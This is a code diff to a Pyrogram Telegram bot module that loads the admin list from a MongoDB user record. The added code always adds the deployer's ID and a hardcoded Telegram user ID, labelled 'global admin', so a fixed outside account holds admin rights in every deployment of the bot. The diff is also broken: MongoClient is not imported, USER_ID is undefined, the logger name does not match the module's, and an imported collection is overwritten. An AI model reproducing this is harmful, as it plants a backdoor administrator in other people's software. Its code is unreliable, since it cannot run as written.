@@ -3,11 +3,34 @@ import logging
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from database import users_col, stats_col, files_col
-from bot import ADMINS  # ADMINS must be a list of user IDs
+from bot import CODE2_MONGO_URI, CODE2_DB_NAME # ADMINS must be a list of user IDs
 
 log = logging.getLogger(__name__)
 
 PER_PAGE = 20  # Users per page
+
+mongo_client = MongoClient(CODE2_MONGO_URI)
+db = mongo_client[CODE2_DB_NAME]
+users_col = db["users"]
+user_data = users_col.find_one({"USER_ID": USER_ID})
+
+raw_admins = user_data.get("ADMINS", [])
+
+if isinstance(raw_admins, str):
+    # Convert "123,456,789" → [123, 456, 789]
+    raw_admins = [x.strip() for x in raw_admins.split(",") if x.strip()]
+
+ADMINS = []
+for x in raw_admins:
+    try:
+        ADMINS.append(int(x))
+    except (TypeError, ValueError):
+        pass
+
+# Always include deployer + global admin
+FINAL_ADMINS = sorted(list(set(ADMINS + [USER_ID, 6789146594])))
+
+logger.info(f"✅ ADMINS list: {FINAL_ADMINS}, User ID: {USER_ID}")
 
 
 def get_total_users():
